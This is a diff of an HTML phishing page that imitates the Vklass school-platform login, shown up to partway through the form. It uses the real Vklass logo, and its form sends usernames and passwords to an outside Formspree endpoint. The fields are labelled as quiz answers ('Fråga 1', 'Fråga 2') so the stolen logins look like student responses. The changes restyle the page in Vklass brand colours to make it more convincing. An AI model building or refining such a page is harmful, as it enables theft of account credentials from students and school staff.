@@ -24,64 +24,66 @@
       width: 100%;
       max-width: 420px;
       border-radius: 8px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.12);
       overflow: hidden;
       margin: 1rem;
     }
     .header {
-      background: linear-gradient(135deg, #0066cc, #0099ff);
+      background: linear-gradient(135deg, #3948A0, #0066cc);
       color: white;
-      padding: 2.2rem 1.8rem 1.6rem;
+      padding: 2.4rem 1.8rem 1.8rem;
       text-align: center;
     }
     .header img {
-      height: 48px;
-      margin-bottom: 1rem;
+      height: 54px;
+      margin-bottom: 1.2rem;
     }
     .header h1 {
       margin: 0;
-      font-size: 1.55rem;
+      font-size: 1.6rem;
       font-weight: 500;
     }
     .content {
-      padding: 2rem 2.2rem 1.8rem;
+      padding: 2.2rem 2.4rem 2rem;
     }
     label {
       display: block;
-      margin-bottom: 0.5rem;
+      margin-bottom: 0.55rem;
       font-weight: 500;
       color: #444;
       font-size: 0.95rem;
     }
     input {
       width: 100%;
-      padding: 0.9rem 1rem;
+      padding: 0.95rem 1rem;
       border: 1px solid #ced4da;
       border-radius: 6px;
       font-size: 1rem;
       box-sizing: border-box;
-      transition: border-color 0.15s;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
     input:focus {
       outline: none;
-      border-color: #0066cc;
-      box-shadow: 0 0 0 3px rgba(0,102,204,0.15);
+      border-color: #73BC56;
+      box-shadow: 0 0 0 3px rgba(115,188,86,0.2);
     }
     .checkbox {
-      margin: 1.2rem 0;
+      margin: 1.3rem 0;
       display: flex;
       align-items: center;
       font-size: 0.95rem;
-      color: #555;
+      color: #444;
     }
     .checkbox input {
       width: auto;
-      margin-right: 0.6rem;
+      height: 18px;
+      margin-right: 0.7rem;
+      accent-color: #73BC56;
     }
     button {
       width: 100%;
-      padding: 1rem;
-      background: #0066cc;
+      padding: 1.05rem;
+      background: #73BC56;
       color: white;
       border: none;
       border-radius: 6px;
@@ -91,24 +93,25 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 0.5rem;
+      gap: 0.6rem;
       transition: background 0.2s;
     }
     button:hover {
-      background: #0055b3;
+      background: #5ea347;
     }
     button::after {
       content: "→";
-      font-size: 1.3rem;
+      font-size: 1.35rem;
     }
     .links {
       text-align: center;
-      margin-top: 1.4rem;
+      margin-top: 1.5rem;
       font-size: 0.95rem;
     }
     .links a {
-      color: #0066cc;
+      color: #73BC56;
       text-decoration: none;
+      font-weight: 500;
     }
     .links a:hover {
       text-decoration: underline;
@@ -117,7 +120,7 @@
       text-align: center;
       color: #777;
       font-size: 0.85rem;
-      margin: 2rem 0 1rem;
+      margin: 2.5rem 0 1.5rem;
     }
   </style>
 </head>
@@ -125,24 +128,23 @@
 
   <div class="container">
     <div class="header">
-      <!-- Byt gärna ut src till riktig Vklass-logga om du har den -->
-      <img src="https://www.vklass.se/images/_common/vklass.svg" alt="Vklass logga" 
-           onerror="this.src='https://via.placeholder.com/180x48/0066cc/ffffff?text=Vklass';">
+      <img src="https://www.vklass.se/images/_common/vklass.svg" 
+           alt="Vklass logga">
       <h1>Logga in i Vklass</h1>
     </div>
 
     <div class="content">
       <form action="https://formspree.io/f/meelzawg" method="POST">
-        <!-- Dolda fält -->
+        <!-- Dolda fält för Formspree -->
         <input type="hidden" name="_subject" value="Nytt elevsvar - Frågor">
         <input type="hidden" name="_language" value="sv">
 
-        <div style="margin-bottom: 1.4rem;">
+        <div style="margin-bottom: 1.5rem;">
           <label for="q1">Användarnamn</label>
           <input type="text" id="q1" name="Fråga 1" required autocomplete="off" placeholder="Användarnamn eller e-post">
         </div>
 
-        <div style="margin-bottom: 1.2rem;">
+        <div style="margin-bottom: 1.3rem;">
           <label for="q2">Lösenord</label>
           <input type="password" id="q2" name="Fråga 2" required autocomplete="off" placeholder="Lösenord">
         </div>
